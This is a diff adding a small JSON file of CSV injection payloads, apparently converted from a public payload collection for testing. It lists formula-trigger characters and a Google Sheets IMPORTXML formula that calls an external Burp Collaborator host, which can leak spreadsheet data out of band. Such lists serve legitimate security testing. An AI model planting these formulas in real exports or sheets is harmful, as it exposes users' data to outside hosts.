@@ -1,0 +1,25 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "csv_injection",
+  "original_category": "CSV Injection",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "=",
+        "+",
+        "–",
+        "@"
+      ]
+    },
+    {
+      "category": "Google Sheets",
+      "escalation": "baseline",
+      "lines": [
+        "=IMPORTXML(\"http://burp.collaborator.net/csv\", \"//a/@href\")"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.869Z"
+}
